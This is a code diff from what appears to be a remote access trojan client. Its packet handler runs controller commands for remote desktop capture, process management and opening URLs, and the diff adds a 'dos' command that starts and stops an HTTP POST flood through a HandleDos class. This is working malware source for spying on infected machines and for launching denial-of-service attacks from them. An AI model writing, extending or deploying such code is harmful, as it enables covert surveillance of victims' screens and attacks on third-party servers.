@@ -12,7 +12,8 @@ namespace Client.Handle_Packet
 {
     public static class Packet
     {
-        public static bool KeyRecevied = false;
+        public static CancellationTokenSource cts;
+
         public static void Read(object data)
         {
             try
@@ -94,17 +95,10 @@ namespace Client.Handle_Packet
 
                     case "remoteDesktop":
                         {
-                        //    switch (unpack_msgpack.ForcePathObject("Option").AsString)
-                            //{
-                                //case "true":
-                                 //   {
-                                        HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
-                                        remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
-                                        break;
-                                  //  }
-                            }
-                           // break;
-                     //   }
+                            HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
+                            remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger));
+                            break;
+                        }
 
                     case "processManager":
                         {
@@ -213,6 +207,27 @@ namespace Client.Handle_Packet
                             if (url.StartsWith("http"))
                             {
                                 Process.Start(url);
+                            }
+                            break;
+                        }
+
+                    case "dos":
+                        {
+                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
+                            {
+                                case "postStart":
+                                    {
+                                        HandleDos handleDos = new HandleDos();
+                                        cts = new CancellationTokenSource();
+                                        handleDos.DosPost(unpack_msgpack);
+                                        break;
+                                    }
+
+                                case "postStop":
+                                    {
+                                        cts.Cancel();
+                                        break;
+                                    }
                             }
                             break;
                         }
